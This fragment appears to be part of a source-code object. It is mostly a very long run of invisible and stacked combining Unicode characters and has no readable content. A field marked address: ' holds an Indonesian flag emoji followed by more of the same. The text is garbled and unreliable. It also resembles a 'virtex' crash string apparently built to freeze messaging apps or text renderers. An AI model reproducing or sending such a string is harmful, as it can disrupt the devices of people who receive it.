͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊ ',
						address: '🇮🇩̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̛͌̏̀̽̓̓͑̽̂͝͡